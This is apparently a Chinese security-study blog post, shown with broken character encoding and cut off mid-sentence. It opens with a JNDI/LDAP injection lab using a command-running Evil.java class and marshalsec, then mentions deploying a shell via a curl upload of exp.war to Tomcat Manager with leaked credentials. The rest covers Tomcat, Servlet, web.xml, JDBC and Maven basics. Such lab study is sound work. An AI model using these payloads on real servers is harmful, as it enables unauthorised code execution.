å‡†å¤‡çš„Evil.java javac Evil.javaç¼–è¯‘å¥½.å¹¶èµ·ä¸€ä¸ªpython webæœåŠ¡ç›‘å¬åœ¨å¯¹åº”çš„ç«¯å£ 12345678public class Evil &#123; public Evil() throws Exception &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123;\"touch\",\"/tmp/a\"&#125;; Process pc = rt.exec(commands); pc.waitFor(); &#125;&#125; ä¸è¿‡æˆ‘å› ä¸ºç‰ˆæœ¬é—®é¢˜æ‰€ä»¥éƒ½å¤±è´¥äº†ã€‚å¯ä»¥çœ‹åˆ°å…¶æŠ›å‡ºçš„com.sun.jndi.rmi.object.trustURLCodebaseé”™è¯¯ã€‚ è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä¸Šé¢æåˆ°è¯´ldapã€‚LDAP+Referenceçš„æŠ€å·§è¿œç¨‹åŠ è½½Factoryç±»ä¸å—RMI+Referenceä¸­çš„com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebaseç­‰å±æ€§çš„é™åˆ¶ï¼Œæ‰€ä»¥é€‚ç”¨èŒƒå›´æ›´å¹¿ã€‚ä½†åœ¨JDK 8u191ã€7u201ã€6u211ä¹‹åï¼Œcom.sun.jndi.ldap.object.trustURLCodebaseå±æ€§çš„é»˜è®¤å€¼è¢«è®¾ç½®ä¸ºfalseï¼Œå¯¹LDAP Referenceè¿œç¨‹å·¥å‚ç±»çš„åŠ è½½å¢åŠ äº†é™åˆ¶ã€‚ æˆ‘ä»¬æ¢ç”¨ldapçš„å‘½ä»¤è¯•è¯• CLIENT.java 123456789101112import javax.naming.Context;import javax.naming.InitialContext;import javax.swing.*;public class CLIENT &#123; public static void main(String[] args) throws Exception &#123; String uri = \"ldap://127.0.0.1:1389/aa\"; Context ctx = new InitialContext(); ctx.lookup(uri); &#125;&#125; marshalsecèµ·æœåŠ¡ã€‚evil.classå‡†å¤‡å¼¹shellæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚å¯ä»¥çœ‹åˆ°ldapçš„ç‰ˆæœ¬ä½¿ç”¨èŒƒå›´ç¡®å®æ¯”rmiæ›´å¹¿ã€‚ è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç»•è¿‡é«˜ç‰ˆæœ¬çš„jndiæ³¨å…¥ã€‚å±äºè¿›é˜¶æŠ€å·§äº†ã€‚æš‚æ—¶å…ˆç•™ä¸ªå‘ã€‚ç­‰é‡åˆ°å†å¡«ã€‚ developä¸Šé¢åŸºæœ¬ä¸Šæ˜¯æŠŠjavaçš„ä¸€äº›æ¯”è¾ƒåŸºç¡€çš„æ¼æ´æˆ–å¤šæˆ–å°‘å¤ç°å¹¶åˆ†æäº†ä¸€éã€‚æ„Ÿè§‰æ¥è§¦èµ·æ¥è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚ä¸è¿‡æŒ‰ç…§ä¹‹å‰çš„è®¡åˆ’,ç°åœ¨è¦æŠŠjava_webçš„çŸ¥è¯†æ›´æ·±å…¥äº†è§£ä¸‹ã€‚æ–¹ä¾¿è‡ªå·±ä»¥åæ›´ç†Ÿæ‚‰æ–‡ä»¶ç»“æ„æˆ–è€…ç›¸åº”çš„æ–¹æ³•,åŒæ—¶ä¹Ÿæ˜¯ä¸ºäº†å¼€å‘åšè¿›ä¸€æ­¥è€ƒè™‘ã€‚è‡³äºjavaä¸€äº›å¸¸è§æ¼æ´å¦‚jackson,fastjsonä»¥åŠå…¶ä»–ä¸€äº›æ¡†æ¶å¦‚strutsçš„æ¼æ´ç­‰ç­‰æ–¹å‘çš„æ·±å…¥å°±ç•™åˆ°åé¢å…¶ä»–æ–‡ç« é‡Œè®°å½•äº†ã€‚ tomcatwebèµ„æºæƒ³è¦è¢«è¿œç¨‹è®¡ç®—æœºè®¿é—®,éƒ½éœ€è¦ä¸€ä¸ªä¸ä¹‹è¿›è¡Œç½‘ç»œé€šä¿¡çš„ç¨‹åºã€‚webæœåŠ¡å™¨å°±æ˜¯è¿™æ ·çš„ç¨‹åºã€‚å¯¹javaè€Œè¨€,æ”¯æŒå…¨éƒ¨JSPä»¥åŠServletè§„èŒƒçš„tomcatæœåŠ¡å™¨æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚tomcatçš„ä¸‹è½½å®‰è£…å°±ä¸å¤šèµ˜è¿°äº†ã€‚æŒ‰ç…§æ•™ç¨‹èµ°å°±å¥½ã€‚ è¿™é‡Œå¯¹tomcatçš„ä¸€äº›ç»†èŠ‚è¿›è¡Œå™è¿° $CATALINA_HOME tomcatçš„æ ¹ç›®å½•ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡é…ç½®$CATALINA_BASE,ä¸ºå¤šä¸ªtomcatå®ä¾‹çš„ä¸ªä½“è®¾å®šå¯¹åº”çš„å±æ€§ã€‚ path /binå­˜æ”¾ç”¨äºå¯åŠ¨åŠå…³é—­çš„æ–‡ä»¶ï¼Œä»¥åŠå…¶ä»–ä¸€äº›è„šæœ¬ã€‚å…¶ä¸­ï¼ŒUNIX ç³»ç»Ÿä¸“ç”¨çš„ *.sh æ–‡ä»¶åœ¨åŠŸèƒ½ä¸Šç­‰åŒäº Windows ç³»ç»Ÿä¸“ç”¨çš„ *.bat æ–‡ä»¶ /confé…ç½®æ–‡ä»¶åŠç›¸å…³çš„ DTDã€‚å…¶ä¸­æœ€é‡è¦çš„æ–‡ä»¶æ˜¯ server.xmlï¼Œè¿™æ˜¯å®¹å™¨çš„ä¸»é…ç½®æ–‡ä»¶å½“ç„¶å…¶ä»–ä¸€äº›æ–‡ä»¶ä¹Ÿå¾ˆé‡è¦ã€‚ä¸ªäººé‡åˆ°è¿‡çš„è¿˜æœ‰catalina.policy,tomcat-users.xml,web.xmlè¿™å‡ ä¸ªé‡è¦é…ç½®æ–‡ä»¶ã€‚ /logæ—¥å¿—æ–‡ä»¶çš„é»˜è®¤ç›®å½•ã€‚ /webappså­˜æ”¾ Web åº”ç”¨çš„ç›¸å…³æ–‡ä»¶ã€‚ åº”ç”¨éƒ¨ç½² åœ¨ Tomcat æœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥é€šè¿‡å¤šç§æ–¹æ³•éƒ¨ç½² Web åº”ç”¨:1.é™æ€éƒ¨ç½²2.åŠ¨æ€éƒ¨ç½² é™æ€éƒ¨ç½²æˆ‘ä»¬åº”è¯¥å¾ˆç†Ÿæ‚‰ã€‚å°±æ˜¯å¸¸è§„çš„å¼€å‘æµç¨‹ã€‚åœ¨å¯åŠ¨ä¹‹å‰å°±å†™å¥½webåº”ç”¨ã€‚ä½†æ˜¯åŠ¨æ€éƒ¨ç½²å¯èƒ½å°±æ¥è§¦çš„ç›¸å¯¹è¾ƒå°‘ã€‚ä½†å…¶å®å°±æ˜¯ä½¿ç”¨tomcatmanagerç›´æ¥æ“ä½œç®¡ç†webåº”ç”¨ã€‚ å…³äºtomcat managerè¦ç­‰åˆ°ä¸“é—¨è®²manageræ—¶å†ä»”ç»†ç†è§£ã€‚ ä¸Šä¸‹æ–‡ ä¸Šä¸‹æ–‡åœ¨ Tomcat ä¸­å…¶å®å°±æ˜¯ Web åº”ç”¨çš„æ„æ€ã€‚ä¸ºäº†åœ¨ Tomcat ä¸­é…ç½®ä¸Šä¸‹æ–‡ï¼Œéœ€è¦ç”¨åˆ°ä¸Šä¸‹æ–‡æè¿°ç¬¦æ–‡ä»¶ã€‚åœ¨tomcatä¸­å…¶å®å°±æ˜¯xmlæ–‡ä»¶ã€‚ä¸Šä¸‹æ–‡æè¿°ç¬¦æ–‡ä»¶ä½äºï¼š1.$CATALINA_BASE/conf/[enginename]/[hostname]/[webappname].xml2.$CATALINA_BASE/webapps/[webappname]/META-INF/context.xmlåœ¨ç›®å½• 1 ä¸­çš„æ–‡ä»¶åä¸º [webappname].xmlï¼Œä½†åœ¨ç›®å½• 2 ä¸­ï¼Œæ–‡ä»¶åä¸º context.xmlã€‚å¦‚æœæŸä¸ª Web åº”ç”¨æ²¡æœ‰ç›¸åº”çš„ä¸Šä¸‹æ–‡æè¿°ç¬¦æ–‡ä»¶ï¼ŒTomcat å°±ä¼šä½¿ç”¨é»˜è®¤å€¼é…ç½®è¯¥åº”ç”¨ã€‚ Tomcat Manager å¾ˆå¤šç”Ÿäº§ç¯å¢ƒéƒ½éå¸¸éœ€è¦ä»¥ä¸‹ç‰¹æ€§ï¼šåœ¨æ— éœ€å…³é—­æˆ–é‡å¯æ•´ä¸ªå®¹å™¨çš„æƒ…å†µä¸‹ï¼Œéƒ¨ç½²æ–°çš„ Web åº”ç”¨æˆ–è€…å–æ¶ˆå¯¹ç°æœ‰åº”ç”¨çš„éƒ¨ç½²ã€‚æˆ–è€…ï¼Œå³ä¾¿åœ¨ Tomcat æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æ²¡æœ‰æŒ‡å®š reloadable çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥è¯·æ±‚é‡æ–°åŠ è½½ç°æœ‰åº”ç”¨ã€‚ Tomcat ä¸­çš„ Web åº”ç”¨ Manager å°±æ˜¯æ¥è§£å†³è¿™äº›é—®é¢˜çš„ï¼Œå®ƒé»˜è®¤å®‰è£…åœ¨ä¸Šä¸‹æ–‡è·¯å¾„ï¼š/manager ä¸­ Tomcat ä»¥é»˜è®¤å€¼è¿è¡Œæ˜¯éå¸¸å±é™©çš„ï¼Œå› ä¸ºè¿™èƒ½è®©äº’è”ç½‘ä¸Šçš„ä»»ä½•äººéƒ½å¯ä»¥åœ¨ä½ çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œ Manager åº”ç”¨ã€‚å› æ­¤ï¼ŒManager åº”ç”¨è¦æ±‚ä»»ä½•ç”¨æˆ·åœ¨ä½¿ç”¨å‰å¿…é¡»éªŒè¯è‡ªå·±çš„èº«ä»½ï¼Œæä¾›è‡ªå·±çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œä»¥åŠç›¸åº”é…ç½®çš„ manager-** è§’è‰²ï¼ˆè§’è‰²åç§°æ ¹æ®æ‰€éœ€çš„åŠŸèƒ½è€Œå®šï¼‰ã€‚å¦å¤–ï¼Œé»˜è®¤ç”¨æˆ·æ–‡ä»¶ï¼ˆ$CATALINA_BASE/conf/tomcat-users.xmlï¼‰ä¸­çš„ç”¨æˆ·åç§°éƒ½æ²¡æœ‰æŒ‡å®šè§’è‰²åç§°ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯ä¸èƒ½è®¿é—® Manager åº”ç”¨çš„ã€‚ è¿™äº›è§’è‰²åç§°ä½äº Manager åº”ç”¨çš„ web.xml æ–‡ä»¶ä¸­ã€‚å¯ç”¨çš„è§’è‰²åŒ…æ‹¬ï¼š manager-gui èƒ½å¤Ÿè®¿é—® HTML ç•Œé¢ã€‚manager-status åªèƒ½è®¿é—®â€œæœåŠ¡å™¨çŠ¶æ€â€ï¼ˆServer Statusï¼‰é¡µé¢ã€‚manager-script èƒ½å¤Ÿè®¿é—®æ–‡æ¡£ä¸­æè¿°çš„é€‚ç”¨äºå·¥å…·çš„çº¯æ–‡æœ¬ç•Œé¢ï¼Œä»¥åŠâ€æœåŠ¡å™¨çŠ¶æ€â€é¡µé¢ã€‚manager-jmx èƒ½å¤Ÿè®¿é—® JMX ä»£ç†ç•Œé¢ä»¥åŠâ€œæœåŠ¡å™¨çŠ¶æ€â€ï¼ˆServer Statusï¼‰é¡µé¢ã€‚ ä¸ºäº†èƒ½å¤Ÿè®¿é—® Manager åº”ç”¨ï¼Œå¿…é¡»åˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·å/å¯†ç ç»„åˆï¼Œå¹¶ä¸ºä¹‹æˆäºˆä¸€ç§ manager-** è§’è‰²ï¼Œæˆ–è€…æŠŠä¸€ç§ manager-** è§’è‰²æˆäºˆç°æœ‰çš„ç”¨æˆ·å/å¯†ç ç»„åˆ æ¯”è¾ƒå±é™©çš„æƒ…å†µå°±å¦‚ä¹‹å‰æ›¾ç»åšè¿‡å‡ æ¬¡çš„javaé¢˜ä¸­å‡ºç°çš„tomcatå¼±å¯†ç éƒ¨ç½²waræˆ–è€…tomcatå¯†ç æ³„éœ²,å‘½ä»¤è¡Œéƒ¨ç½²warçš„æƒ…å†µä¸€æ ·ã€‚ æ³¨æ„ä¸€ç‚¹,tomcatæ”¯æŒé€šè¿‡è¯·æ±‚urlè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚http://{host}:{port}/manager/text/{command}?{parameters} æ¯”å¦‚æˆ‘åšè¿‡çš„htbæŸé¶æœºä¸­,ç”¨æˆ·å¯†ç æ³„éœ²äº†ã€‚ä½†æ˜¯ç”¨æˆ·æ˜¯admin-gui,manager-scriptæƒé™,æˆ‘ä»¬æ²¡æ³•é€šè¿‡è´¦æˆ·å¯†ç ç™»å½•manager/htmlæ‰‹åŠ¨éƒ¨ç½²war.ä½†æ˜¯å´å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ¥éƒ¨ç½²war getshell. 1curl --user 'tomcat:xxxx' --upload-file exp.war \"http://xxxx:8080/manager/text/deploy=/exp.war\" è¿™æ ·å°±å¯ä»¥é€šè¿‡è®¿é—®webç›®å½•expç›´æ¥æ“ä½œshelläº†ã€‚ å®‰å…¨ç®¡ç† Java çš„ SecurityManager èƒ½è®© Web æµè§ˆå™¨åœ¨å®ƒè‡ªèº«çš„æ²™ç›’ä¸­è¿è¡Œå°å‹åº”ç”¨ï¼ˆappletï¼‰ï¼Œä»è€Œå…·æœ‰é˜²æ­¢ä¸å¯ä¿¡ä»£ç è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ä»¥åŠé˜²æ­¢å…¶è¿æ¥åˆ°ä¸»æœºï¼Œè€Œä¸æ˜¯åŠ è½½è¯¥åº”ç”¨çš„ä½ç½®ã€‚SecurityManager èƒ½é˜²æ­¢ä¸å¯ä¿¡çš„å°å‹åº”ç”¨åœ¨ä½ çš„æµè§ˆå™¨ä¸Šè¿è¡Œï¼Œè¿è¡Œ Tomcat æ—¶ï¼Œä½¿ç”¨ SecurityManager ä¹Ÿèƒ½ä¿æŠ¤æœåŠ¡å™¨ï¼Œä½¿å…¶å…å—æœ¨é©¬å‹çš„ appletã€JSPã€JSP Bean ä»¥åŠæ ‡ç­¾åº“çš„ä¾µå®³ï¼Œç”šè‡³ä¹Ÿå¯ä»¥é˜²æ­¢ç”±äºæ— æ„ä¸­çš„ç–å¿½æ‰€é€ æˆçš„é—®é¢˜ã€‚ å…³äºé€‚ç”¨äº Tomcat çš„æ ‡å‡†ç³»ç»Ÿ SecurityManager æƒé™ç±».åŒ…æ‹¬ä½†ä¸é™äºï¼š1.java.lang.RuntimePermissionâ€”â€”æ§åˆ¶ä¸€äº›ç³»ç»Ÿ/è¿è¡Œæ—¶å‡½æ•°çš„ä½¿ç”¨ï¼Œæ¯”å¦‚ exit() å’Œ exec()ã€‚ å¦å¤–ä¹Ÿæ§åˆ¶åŒ…çš„è®¿é—®/å®šä¹‰ã€‚2.java.io.FilePermissionâ€”â€”æ§åˆ¶å¯¹æ–‡ä»¶å’Œç›®å½•çš„è¯»/å†™/æ‰§è¡Œã€‚3.java.security.AllPermissionâ€”â€”å…è®¸è®¿é—®ä»»ä½•æƒé™ï¼Œä»¿ä½›æ²¡æœ‰ SecurityManagerã€‚â€¦â€¦ å…¶å¯¹åº”çš„ç­–ç•¥æ–‡ä»¶å°±æ˜¯catalina.policyã€‚ ServletServletç®—æ˜¯javawebæ¯”è¾ƒç‰¹è‰²çš„ç¨‹åºäº†ã€‚å®ƒæ˜¯ä½œä¸ºæ¥è‡ª Web æµè§ˆå™¨æˆ–å…¶ä»– HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚ä»æŸç§è§’åº¦è®²,ä»–èƒ½è·Ÿphpåšåˆ°çš„åŠŸèƒ½è¿‘ä¹ç±»ä¼¼ã€‚Java ç±»åº“çš„å…¨éƒ¨åŠŸèƒ½å¯¹ Servlet æ¥è¯´éƒ½æ˜¯å¯ç”¨çš„ã€‚å®ƒå¯ä»¥é€šè¿‡ sockets å’Œ RMI æœºåˆ¶ä¸ appletsã€æ•°æ®åº“æˆ–å…¶ä»–è½¯ä»¶è¿›è¡Œäº¤äº’ã€‚ Life Cycle Servletçš„ç”Ÿå‘½å‘¨æœŸå¯è¢«å®šä¹‰ä¸ºä»åˆ›å»ºç›´åˆ°æ¯ç­çš„æ•´ä¸ªè¿‡ç¨‹ã€‚ä»¥ä¸‹æ˜¯ Servlet éµå¾ªçš„è¿‡ç¨‹ï¼š 1.é€šè¿‡è°ƒç”¨ init () æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ã€‚2.è°ƒç”¨ service() æ–¹æ³•æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚3.é€šè¿‡è°ƒç”¨ destroy() æ–¹æ³•ç»ˆæ­¢ï¼ˆç»“æŸï¼‰ã€‚æœ€åï¼ŒServlet æ˜¯ç”± JVM çš„åƒåœ¾å›æ”¶å™¨è¿›è¡Œåƒåœ¾å›æ”¶çš„ã€‚ init()å¯ç†è§£ä¸ºåˆå§‹åŒ–,ä½†ä¸æ˜¯æ„é€ æ–¹æ³•ã€‚(javaæ„é€ æ–¹æ³•å¿…é¡»æ˜¯è·Ÿç±»ååŒåçš„)ä¸€èˆ¬è¿›è¡Œç®€å•çš„å‚æ•°è®¾å®šã€‚ service()ç”¨æ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚å¹¶å°†æ ¼å¼åŒ–çš„å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ã€‚æˆ‘ä»¬é€šå¸¸å¹¶ä¸éœ€è¦å¯¹è¿™ä¸ªæ–¹æ³•è¿›è¡Œæ”¹å–„,è€Œæ˜¯é‡å†™å…¶è°ƒç”¨çš„doGet,doPostç­‰æ–¹æ³•ã€‚ doGet(),doPost()æ ¼å¼å‡å¦‚ä¸‹ï¼š 1234public void [doGet or doPost](HttpServletRequest request,HttpServletResponse response) throws ServletException, IOException &#123; // Servlet code&#125; destroy() æ–¹æ³•åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œåœ¨ Servlet ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶è¢«è°ƒç”¨ã€‚destroy() æ–¹æ³•å¯ä»¥è®©æ‚¨çš„ Servlet å…³é—­æ•°æ®åº“è¿æ¥ã€åœæ­¢åå°çº¿ç¨‹ã€æŠŠ Cookie åˆ—è¡¨æˆ–ç‚¹å‡»è®¡æ•°å™¨å†™å…¥åˆ°ç£ç›˜ï¼Œå¹¶æ‰§è¡Œå…¶ä»–ç±»ä¼¼çš„æ¸…ç†æ´»åŠ¨ã€‚åœ¨è°ƒç”¨ destroy() æ–¹æ³•ä¹‹åï¼Œservlet å¯¹è±¡è¢«æ ‡è®°ä¸ºåƒåœ¾å›æ”¶ éƒ¨ç½² è¿™ä¸€éƒ¨åˆ†åº”è¯¥ç®—æ˜¯webå¼€å‘çš„åŸºæœ¬æµç¨‹äº†,å› ä¸ºä»¥å‰åªæ˜¯å®¡è¿‡æºç ,æ‰€ä»¥åœ¨å®é™…ä½¿ç”¨ideaè¿›è¡Œé¡¹ç›®åˆ›å»ºä»¥åŠå†…å®¹ç¼–å†™ä¸Šè¿˜æ˜¯å¾—é‡æ–°æ¥è¿‡ã€‚ æµç¨‹:ideaåˆ›å»ºjavaEnterpriseé¡¹ç›®å¹¶é€‰æ‹©Additional Libraryä¸­çš„Web Application. =&gt; åœ¨æ–°å»ºé¡¹ç›®ä¸‹çš„web/WEB-INFç›®å½•ä¸‹æ–°å»ºlib,src,classesä¸‰ä¸ªæ–‡ä»¶å¤¹ =&gt; æ›´æ”¹é¡¹ç›®ç»“æ„ï¼š 1.src å¯ä»¥åœ¨Project Structureçš„modulesä¸­é‡æ–°è®¾ç½®source.æˆ‘ä»¬éœ€è¦æŠŠSourcesä»åŸå·¥ç¨‹çš„srcæ”¹ä¸ºWEB-INFä¸‹çš„src.Sources ä¸€èˆ¬ç”¨äºæ ‡æ³¨ç±»ä¼¼ src è¿™ç§å¯ç¼–è¯‘ç›®å½•ã€‚æœ‰æ—¶å€™æˆ‘ä»¬ä¸å•å•é¡¹ç›®çš„ src ç›®å½•è¦å¯ç¼–è¯‘ï¼Œè¿˜æœ‰å…¶ä»–ä¸€äº›ç‰¹åˆ«çš„ç›®å½•ä¹Ÿè®¸æˆ‘ä»¬ä¹Ÿè¦ä½œä¸ºå¯ç¼–è¯‘çš„ç›®å½•ï¼Œå°±éœ€è¦å¯¹è¯¥ç›®å½•è¿›è¡Œæ­¤æ ‡æ³¨ã€‚åªæœ‰ Sources è¿™ç§å¯ç¼–è¯‘ç›®å½•æ‰å¯ä»¥æ–°å»º Java ç±»å’ŒåŒ…ã€‚(æ­¤å¤„å·¥ç¨‹è‡ªå·±åˆ›å»ºçš„srcæ²¡ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ”¹æˆwebç›®å½•ä¸‹çš„æºæ–‡ä»¶å¤¹)2.classes ç”¨æ¥å­˜æ”¾ç¼–è¯‘åè¾“å‡ºçš„classæ–‡ä»¶.æˆ‘ä»¬åŒæ ·åœ¨é¡¹ç›®ç»“æ„ä¸­Pathsçš„é…ç½®é‡Œå°†Output pathå’ŒTest output pathéƒ½é€‰æ‹©åˆšåˆšåˆ›å»ºçš„classesæ–‡ä»¶å¤¹ã€‚3.libç”¨äºå¤–éƒ¨jaråŒ…ã€‚ç”±äºæˆ‘ä»¬å¼€å‘æ—¶å¿…ç„¶ä¼šç”¨åˆ°å¤–éƒ¨ä¾èµ–,æ‰€ä»¥å­˜æ”¾jaråŒ…çš„libä¹Ÿéœ€è¦åœ¨é¡¹ç›®ä¸­è®¾ç½®ã€‚æˆ‘ä»¬åŒæ ·åœ¨modulesä¸­æŠŠlibæ·»åŠ ä¸ºjar directoryå³å¯ã€‚ ç„¶åæ˜¯é…ç½®tomcatæœåŠ¡å™¨,è¿™ä¸ªæ²¡å•¥å¥½è¯´çš„ã€‚ä¸è¿‡è¿˜æ˜¯è¦æ³¨æ„artifactè®¾ç½®æ ¹ç›®å½•çš„è¦ç‚¹ã€‚é€šå¸¸è®¾ç½®ä¸º/. Servletç¼–å†™çš„ä¸€ä¸ªdemo.æˆ‘ä»¬é¦–å…ˆè¦åœ¨ä¹‹å‰æ›´æ”¹è¿‡çš„srcä¸‹æ–°å»ºä¸€ä¸ªclass(è™½ç„¶ideaä¼šè‡ªåŠ¨æ¢æˆ.java)å‘½åéšæ„ã€‚ä¸è¿‡æœ€å¥½æ˜¯æŸæŸServlet. 12345678910111213141516171819202122232425262728293031import java.io.*;import javax.servlet.*;import javax.servlet.http.*;public class TestServlet extends HttpServlet&#123; private String quote; public TestServlet()&#123; System.out.println(\"TestServlet constructor called.\"); &#125; @Override public void init() throws ServletException &#123; System.out.println(\"TestServlet init method called\"); quote=\"Thy will , not my will , be done.\"; &#125; @Override public void destroy() &#123; System.out.println(\"TestServlet destroy method called\"); &#125; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; resp.setContentType(\"json\"); PrintWriter out=resp.getWriter(); out.println(\"&#123;\\\"quote\\\":\\\"\"+quote+\"\\\"&#125;\"); &#125;&#125; è¿™é‡Œé¡ºæ‰‹å†™äº†æ„é€ æ–¹æ³•çœ‹çœ‹è°ƒç”¨é¡ºåºã€‚è™½ç„¶æˆ‘ä»¬éƒ½çŸ¥é“æ„é€ æ–¹æ³•å¿…ç„¶æ˜¯æœ€å…ˆè°ƒç”¨çš„ï¼Œå…¶æ¬¡æ˜¯init(),ç„¶åæ˜¯æˆ‘ä»¬æ¯æ¬¡è®¿é—®æ—¶è°ƒç”¨çš„doGet,æœ€ådestroyé”€æ¯ã€‚ ç„¶åæˆ‘ä»¬build moduleã€‚åœ¨WEB-INFä¸‹çš„classesä¸­ç”ŸæˆTestServlet.class.æœ€åå°±æ˜¯é…ç½®web.xmläº†ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒServlet åº”ç”¨ç¨‹åºä½äºè·¯å¾„ /webapps/ROOT ä¸‹ï¼Œä¸”ç±»æ–‡ä»¶æ”¾åœ¨ /webapps/ROOT/WEB-INF/classes ä¸­ã€‚å¦‚æœæœ‰ä¸€ä¸ªå®Œå…¨åˆæ ¼çš„ç±»åç§° com.myorg.MyServletï¼Œé‚£ä¹ˆè¿™ä¸ª Servlet ç±»å¿…é¡»ä½äº WEB-INF/classes/com/myorg/MyServlet.class ä¸­ã€‚ä½äº /webapps/ROOT/WEB-INF/ çš„ web.xml æ–‡ä»¶ä¸­å¿…é¡»è®¾ç½®Servletçš„ç›¸å…³æ¡ç›®ã€‚ æ‰€ä»¥è·¯å¾„ç»“æ„è§„å®šå…¶å®éå¸¸æ¸…æ™°ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦è®¾ç½®web.xml 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\"&gt; &lt;servlet&gt; &lt;servlet-name&gt;test&lt;/servlet-name&gt; &lt;servlet-class&gt;TestServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;test&lt;/servlet-name&gt; &lt;url-pattern&gt;/Test&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; å¯è®¾å®šå¯¹åº”çš„servlet-classå¹¶å®šä¹‰å…¶servletname.åŒæ—¶å¯ä»¥å®šä¹‰è¿™ä¸ªservletå¯¹åº”çš„urlæ˜ å°„ã€‚ å‰©ä¸‹çš„éƒ¨åˆ†å°±è·Ÿå…¶ä»–è¯­è¨€å·®ä¸å¤šäº†,ä½¿ç”¨get,postç­‰å¤„ç†å‚æ•°,cookieåŠç›¸åº”httpè¯·æ±‚ã€‚è¿™é‡Œç¨å¾®è®°å½•ä¸‹sqlè¿æ¥çš„ä½¿ç”¨æ–¹æ³•ã€‚ 1234567891011121314151617181920static final String JDBC_DRIVER = \"com.mysql.jdbc.Driver\"; static final String DB_URL = \"jdbc:mysql://localhost:3306/test\"; static final String USER = \"root\";static final String PASS = \"123456\"; ......Class.forName(\"com.mysql.jdbc.Driver\");conn = DriverManager.getConnection(DB_URL,USER,PASS);......mt = conn.createStatement();String sql;sql = \"SELECT id, name, url FROM websites\";ResultSet rs = stmt.executeQuery(sql);......rs.close();stmt.close();conn.close(); mavenä¹‹å‰ä½¿ç”¨ysoserialè·Ÿmarshalsecæ—¶æƒ³å¿…å¿…ç„¶ç”¨è¿‡mavenäº†ã€‚ä½†æ˜¯å®é™…ä¸Šmavençš„ä½œç”¨ç©¶ç«Ÿæ˜¯ä»€ä¹ˆè¿˜æ˜¯ä¸€å¤´é›¾æ°´ã€‚å› æ­¤é’ˆå¯¹mavenä¹Ÿæ¥å­¦ä¹ ä¸‹ã€‚ what is mavenMaven ç¿»è¯‘ä¸ºâ€ä¸“å®¶â€ã€â€å†…è¡Œâ€ï¼Œæ˜¯ Apache ä¸‹çš„ä¸€ä¸ªçº¯ Java å¼€å‘çš„å¼€æºé¡¹ç›®ã€‚åŸºäºé¡¹ç›®å¯¹è±¡æ¨¡å‹ï¼ˆç¼©å†™ï¼šPOMï¼‰æ¦‚å¿µï¼ŒMavenåˆ©ç”¨ä¸€ä¸ªä¸­å¤®ä¿¡æ¯ç‰‡æ–­èƒ½ç®¡ç†ä¸€ä¸ªé¡¹ç›®çš„æ„å»ºã€æŠ¥å‘Šå’Œæ–‡æ¡£ç­‰æ­¥éª¤ã€‚ Maven æ˜¯ä¸€ä¸ªé¡¹ç›®ç®¡ç†å·¥å…·ï¼Œå¯ä»¥å¯¹ Java é¡¹ç›®è¿›è¡Œæ„å»ºã€ä¾èµ–ç®¡ç†ã€‚ ç¯å¢ƒé…ç½®åªè¦jdk+ä¸‹è½½mavenå³å¯ã€‚å½“ç„¶æˆ‘è®°å¾—IDEAåº”è¯¥æ˜¯æœ‰mavençš„åŠŸèƒ½çš„ã€‚ POM POM å³ project object model.æ˜¯ä¸€ä¸ªxmlæ–‡ä»¶ï¼ŒåŒæ—¶ä¹Ÿæ˜¯mavenå·¥ç¨‹çš„åŸºæœ¬å•å…ƒã€‚åŒ…å«äº†é¡¹ç›®çš„åŸºæœ¬ä¿¡æ¯ï¼Œç”¨äºæè¿°é¡¹ç›®å¦‚ä½•æ„å»ºï¼Œå£°æ˜é¡¹ç›®ä¾èµ–ï¼Œç­‰ç­‰ã€‚ ä¸€ä¸ªpom.xmlçš„demo 12345678910111213141516&lt;project xmlns = \"http://maven.apache.org/POM/4.0.0\" xmlns:xsi = \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation = \"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;!-- æ¨¡å‹ç‰ˆæœ¬ --&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;!-- å…¬å¸æˆ–è€…ç»„ç»‡çš„å”¯ä¸€æ 